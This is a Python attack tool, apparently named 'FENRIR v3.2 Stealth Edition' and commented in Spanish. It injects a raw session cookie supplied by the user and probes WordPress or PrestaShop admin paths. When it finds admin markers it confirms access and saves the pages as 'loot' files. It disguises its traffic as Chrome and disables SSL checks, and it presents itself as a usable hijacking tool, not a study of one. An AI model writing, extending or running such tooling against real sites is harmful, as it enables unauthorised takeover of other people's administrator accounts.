import asyncio
import aiohttp
import base64
import json
import sys
import re
import time
import logging
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from enum import Enum, auto
from http.cookies import SimpleCookie
from yarl import URL

# ==============================================================================
#  🛠️ ARCHITECT CONFIGURATION & UTILS
# ==============================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("FENRIR")

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

class TargetType(Enum):
    WORDPRESS = auto()
    PRESTASHOP = auto()
    GENERIC = auto()

@dataclass
class TargetConfig:
    base_url: str
    type: TargetType
    # 👇 AQUÍ ESTÁ EL CAMBIO: Disfrazamos al script de Google Chrome legítimo
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    timeout: int = 20

# ==============================================================================
#  🐺 CORE ENGINE: FENRIR (STEALTH MODE)
# ==============================================================================

class FenrirEngine:
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        # Unsafe=True es vital para tragar cookies mal formadas o legacy
        jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(ssl=False)
        
        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=connector,
            cookie_jar=jar,
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session: await self.session.close()

    def inject_raw_cookie(self, raw_cookie: str):
        """
        Inyecta cookies crudas parseando el string de cabecera.
        Maneja errores de formato y asigna la URL correcta.
        """
        if not self.session: return
        print(colorize("💉 Inyectando Cookies...", Colors.YELLOW))
        
        try:
            # Usamos yarl.URL para evitar el crash de 'raw_host'
            url_obj = URL(self.config.base_url)
            cookie = SimpleCookie()
            
            # Limpieza básica
            raw_cookie = raw_cookie.replace("Cookie: ", "").strip()
            
            # Validación de Arquitecto: Si no hay '=', es basura
            if "=" not in raw_cookie:
                print(colorize("⚠️ ERROR DE FORMATO: Falta el nombre (Nombre=Valor).", Colors.RED))
                return

            cookie.load(raw_cookie)
            
            for key, morsel in cookie.items():
                self.session.cookie_jar.update_cookies({key: morsel.value}, response_url=url_obj)
            
            print(colorize(f"✅ Cookies cargadas en memoria: {list(cookie.keys())}", Colors.GREEN))
            
        except Exception as e:
            print(colorize(f"❌ Error crítico inyectando cookies: {e}", Colors.RED))

    async def fuzz_endpoints(self, wordlist: List[str]):
        print(colorize(f"\n🐕 RASTREANDO ({self.config.type.name}) - MODO STEALTH ACTIVADO...", Colors.BOLD))
        # Ejecutamos concurrentemente
        tasks = [self._check_endpoint(path) for path in wordlist]
        await asyncio.gather(*tasks)

    async def _check_endpoint(self, path: str):
        if not self.session: return
        try:
            print(f"⏳ Analizando: {path} ...")
            
            async with self.session.get(path, allow_redirects=True) as resp:
                content = await resp.text()
                
                # --- TELEMETRÍA DE DEPURACIÓN ---
                # Extraemos el título para saber qué ve realmente el script
                title_match = re.search('<title>(.*?)</title>', content, re.IGNORECASE)
                page_title = title_match.group(1).strip() if title_match else "Sin Título"
                
                # Determinamos color del status
                status_color = Colors.GREEN if resp.status == 200 else Colors.YELLOW
                if resp.status >= 400: status_color = Colors.RED

                print(f"   [{colorize(str(resp.status), status_color)}] URL Final: {resp.url}")
                print(f"   📄 Título: {colorize(page_title[:60], Colors.CYAN)}...")

                # --- LÓGICA DE DETECCIÓN ---
                is_valid = False
                
                if self.config.type == TargetType.WORDPRESS:
                    # Si acabamos en wp-login.php, la cookie NO sirvió
                    if "wp-login.php" in str(resp.url) or "Log In" in content:
                        print(colorize("   ❌ FALLO: Redirección forzosa al Login (Cookie rechazada).", Colors.RED))
                        return

                    # Palabras sagrada de Admin en WP
                    success_keys = ["wp-admin-bar", "Howdy", "Hola,", "Cerrar sesión", "Log Out", "Escritorio", "Dashboard"]
                    if any(k in content for k in success_keys):
                        is_valid = True

                elif self.config.type == TargetType.PRESTASHOP:
                    # Si la URL tiene 'login', fuera
                    if "login" in str(resp.url).lower() and "AdminLogin" not in path:
                        print(colorize("   ❌ FALLO: Redirección al Login.", Colors.RED))
                        return
                    
                    # Palabras sagrada de PrestaShop
                    ps_keys = ["logout", "employee_box", "PrestaShop", "Cerrar sesión", "Avatar"]
                    if any(k in content for k in ps_keys):
                        is_valid = True

                # --- RESULTADO FINAL ---
                if is_valid:
                    print(f"   {colorize('🔥 ¡BOOM! ACCESO CONFIRMADO', Colors.GREEN)}")
                    # Guardamos la evidencia
                    filename = f"loot_{int(time.time())}.html"
                    with open(filename, "w", encoding="utf-8") as f: f.write(content)
                    print(f"   💾 Evidencia guardada en '{filename}'")
                
                elif resp.status == 200:
                    print(colorize("   ⚠️  Código 200 pero sin privilegios claros (Soft 404 o Usuario raso).", Colors.YELLOW))
                    # Guardamos para depurar por qué falló
                    with open("debug_fail.html", "w", encoding="utf-8") as f: f.write(content)
                    print(f"   💾 HTML guardado en 'debug_fail.html' para análisis forense.")

        except Exception as e:
            print(f"❌ Error de conexión en {path}: {e}")

# ==============================================================================
#  🏁 MAIN ENTRY POINT
# ==============================================================================

async def main():
    print(colorize("\n🐺 FENRIR v3.2 - STEALTH EDITION 🐺\n", Colors.RED))

    base_input = input(">> URL Base (RAÍZ): ").strip()
    if not base_input.startswith("http"): base_input = f"http://{base_input}"
    # Fix trailing slash para aiohttp
    if not base_input.endswith("/"): base_input += "/"
    
    print("\n[1] WordPress")
    print("[2] PrestaShop")
    t_choice = input(">> Tecnología: ").strip()
    
    t_type = TargetType.WORDPRESS if t_choice == '1' else TargetType.PRESTASHOP
    
    # Listas de objetivos
    if t_type == TargetType.WORDPRESS:
        wordlist = ["wp-admin/", "wp-admin/index.php", "wp-admin/profile.php"]
    else:
        wordlist = ["admin", "backoffice", "dashboard", "adm", "administrador"]
    
    config = TargetConfig(base_url=base_input, type=t_type)

    async with FenrirEngine(config) as engine:
        print(f"\n{Colors.YELLOW}👉 INYECCIÓN DE COOKIE (Formato: Nombre=Valor){Colors.RESET}")
        raw = input(">> Cookie String: ").strip()
        engine.inject_raw_cookie(raw)

        await engine.fuzz_endpoints(wordlist)

if __name__ == "__main__":
    try:
        # Soporte para Windows (por si acaso)
        if sys.platform == 'win32': 
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Abortado.")